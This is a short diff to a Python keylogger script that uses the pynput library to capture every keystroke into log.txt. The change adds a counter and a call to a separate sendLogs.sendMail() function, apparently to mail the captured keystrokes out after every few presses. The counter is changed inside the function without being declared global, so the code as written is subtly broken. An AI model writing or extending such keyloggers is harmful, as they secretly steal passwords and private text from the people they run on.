@@ -1,8 +1,13 @@
 #!python3
-#keylogger using pynput library
+#keyLogger.py- keylogger using pynput library
 
+import sendLogs
 from pynput.keyboard import Listener
+counter = 0
 def writeInFile(key):
+    if counter > 10:
+        sendLogs.sendMail()
+        counter = 0
     alphabet = str(key)
     alphabet = alphabet.replace("'","")
     if alphabet == 'Key.space':
@@ -19,5 +24,6 @@ def writeInFile(key):
         alphabet = ''
     with open('log.txt','a') as file:
         file.write(alphabet)
+    counter += 1
 with Listener(on_press=writeInFile) as listen:
     listen.join()
